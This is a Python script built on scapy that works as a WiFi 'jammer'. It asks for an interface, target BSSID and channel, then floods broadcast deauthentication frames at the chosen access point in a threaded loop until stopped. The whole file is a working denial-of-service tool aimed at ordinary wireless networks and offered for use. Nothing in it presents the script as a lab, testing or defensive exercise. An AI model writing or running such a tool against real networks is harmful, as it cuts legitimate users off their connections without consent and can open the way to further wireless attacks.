import scapy.all as scapy
from util import out, question, lbl, shader
from time import sleep
from threading import Thread, Event

logo = """
                                                  
                                                +%%%                                                
                                               %%%*%%                                               
                                               %%%%%%  %%                                           
                                      %%%%%%%  %%%%%%  %%%%%%%%                                     
                                  %%%%%%%%%%%  %%%%%%  %%%%%%%%%%#%                                 
                               %%%%%%%%%#      #%%%%%       %%%%%%%%%%                              
                            #%%%%%%%           %%%%%%           %%%%%%%%                            
                          %%%%%%%              %%%%%%              %%%%%%%                          
                         %%%%%%           #%%% %%%%%%  %%%           *%%%%%                         
                          %%%         %%%%%%%% #%%%%%  %%%%%%%         -%%                          
                                   #%%%%%%%%%   %%%%%  %%%%%%%%%%                                   
                                 #%%%%%%%       %*%%#       %%%%%%%                                 
                                *%%%%%          %%%%%         #%%%%%                                
                                 #%%            %%%%%           #%%                                 
                                           %%%  %%%%% %%%%                                          
                                        #%%%%%  %%%%% #%%%%%                                        
                                        %%%%%   %%%%   %%%%%%                                       
                                         %%              +%*                                        
                                                                                                    
                                               %%%%%%                                               
                                              %%%%%%%%                                              
                                              #%%%%%%%                                              
                                               #%%#%%                                               
"""


def deauth_worker(interface, target_bssid, stop_event):
	dot11 = scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) # type: ignore
	deauth = scapy.Dot11Deauth() # type: ignore 
	packet = dot11 / deauth
	sent = 0
	while not stop_event.is_set():
		scapy.sendp(packet, iface=interface, count=10, inter=0.01, verbose=False)
		sent += 10
		sleep(0.05)
	out("info", f"Stopped. Sent {sent} deauth packets.")

def send_deauth_all_threaded(interface, target_bssid, channel):
	stop_event = Event()
	t = Thread(target=deauth_worker, args=(interface, target_bssid, stop_event))
	out("info", f"Starting WiFi jammer on BSSID {target_bssid}, channel {channel}, interface {interface}")
	t.start()
	try:
		question("Press Enter to stop jamming...")
	finally:
		stop_event.set()
		t.join()


def main():
	interface = question("Enter WiFi interface", "e.g. wlan0")
	bssid = question("Enter target BSSID ", "xx:xx:xx:xx:xx:xx")
	channel = question("Enter WiFi channel", "e.g. 1, 6, 11")
	try:
		send_deauth_all_threaded(interface, bssid, channel)
	except Exception as e:
		out("error", f"Error: {e}")

if __name__ == "__main__":
    lbl(shader(logo), 0.0625)
    print("\n")
    main()